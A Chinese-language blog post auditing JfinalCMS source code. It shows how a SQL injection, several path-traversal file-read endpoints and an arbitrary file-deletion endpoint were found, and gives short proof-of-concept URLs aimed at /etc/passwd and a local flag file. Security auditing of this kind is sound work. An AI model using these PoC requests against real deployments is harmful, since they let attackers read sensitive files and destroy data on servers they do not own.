# Jfinalcms代码审计


<!--more-->





## 简介

框架使用的Jfinal，模板引擎使用的beetl

项目中的pom.xml记录了项目需要的依赖及其版本信息等，审计源码前，可以看看项目的给类依赖是否为存在漏洞的版本，如果有可以针对某个依赖的当前版本存在的漏洞进行验证。







## SQL注入

存在的sql注入较多



### 1

jfinal 框架下的预处理为如下，使用占位符：

```java
Long count = Db.queryLong("select count(1) from cms_admin where username = ?",username);
```



这里使用拼接方式进行数据查询，导致SQL注入：

![image-20240707190258530](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190258530.png)

网上追溯，找到source点：

找到在`com/cms/controller/admin/AdminController.java#index()`里，传入的name、username参数未做任何处理就被传递给`findPage()`，那么这里是存在SQL注入的。

![image-20240707190317616](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190317616.png)



测试：

![image-20240707190517209](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190517209.png)

![image-20240707190510186](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190510186.png)



直接用sqlmap跑：

```
http://localhost:8080/admin/admin?name=1
```

![image-20240707190900237](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190900237.png)













## XSS











## 前台任意文件读取

网上已知这个漏洞的poc：`/common/down/file?filekey=/../../../../../../../../../etc/passwd`

我们根据poc去寻找一下，搜索`/common/down`

![image-20240707170721178](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707170721178.png)



可以看到直接从前端获取文件参数，且没有进行过滤，可以使用`../`跨目录读取文件：

![image-20240707170813575](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707170813575.png)



构造请求：

```
http://192.168.3.214:8080/common/down/file?fileKey=/../../../../../../../../../../../../../../../../../tmp/flag.txt
```



![image-20240707171313474](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707171313474.png)





## 任意文件读取

可以搜索的关键字：

```
org.apache.commons.io.FileUtils
org.springframework.stereotype.Controller
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.Paths
import java.util.Scanner
sun.nio.ch.FileChannelImpl
java.io.File.list/listFiles
java.io.FileInputStream
java.io.FileOutputStream
java.io.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem
sun.nio.fs.UnixFileSystemProvider/WindowsFileSystemProvider
java.io.RandomAccessFile
sun.nio.fs.CopyFile
sun.nio.fs.UnixChannelFactory
sun.nio.fs.WindowsChannelFactory
java.nio.channels.AsynchronousFileChannel
FileUtil/IOUtil
BufferedReader
readAllBytes
scanner
```



漏洞点在后台：点击“编辑”的时候，响应会显示文件内容

这个漏洞点在`com/cms/controller/admin/TemplateController.java`中的edit方法：

![image-20240707172003419](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172003419.png)



如果目录**directory**为空的话，则默认就是要传入的文件名

```java
	/**
	 * 编辑
	 */
	public void edit() {
		String fileName = getPara("fileName");
		String directory = getPara("directory");
		if (StringUtils.isBlank(fileName)) {    //filename不能为空
			render(CommonAttribute.ADMIN_ERROR_VIEW);
			return;
		}
		setAttr("directory", directory);
		setAttr("fileName", fileName);
		String filePath = "";
		if(StringUtils.isNotBlank(directory)){   // 目录directory为空和不为空是两种情况，如果目录不为空，则就是以那个目录开始寻找文件
			filePath = "/"+directory.replaceAll(",", "/")+"/"+fileName; //把逗号替换为/,拼接为完整的路径
		}else{
			filePath = "/"+fileName;  //如果目录directory为空的话，则默认就是要传入的文件名
		}
		setAttr("content", StringEscapeUtils.escapeHtml(TemplateUtils.read(filePath)));  //读取
		render(getView("template/edit"));
	}

```



Poc:

```bash
# directory为空
http://192.168.3.214:8080/admin/template/edit?fileName=../../../../../../../../../../../../../../../../../../tmp/flag.txt

# directory不为空
http://192.168.3.214:8080/admin/template/edit?fileName=../../../../../../../../../../../../../../../../../../tmp/flag.txt&directory=default,static
```

![image-20240707172428224](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172428224.png)



![image-20240707172734102](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172734102.png)





## 任意文件删除

都是`admin/template`接口中的，这个是`delete`



可以看到没有任何过滤，可以删除任意文件：

![image-20240707172856234](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172856234.png)

![image-20240707172912044](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172912044.png)





测试：

```
http://192.168.3.214:8080/admin/template/delete?fileName=../../../../../../../../../../../../../../../../../../tmp/flag.txt
```



![image-20240707173853637](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707173853637.png)



同理，update也一样

![image-20240707174007145](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707174007145.png)



同理，`/admin/template/save`也一样







## 任意文件读取



```
http://192.168.3.214:8080/ajax/html?html=../../../../../../../../../../../../../../../../../../tmp/flag.txt
```



目录穿越 直接渲染读取:

![image-20240707174123502](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707174123502.png)













## SSTI

待复现



















---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/  

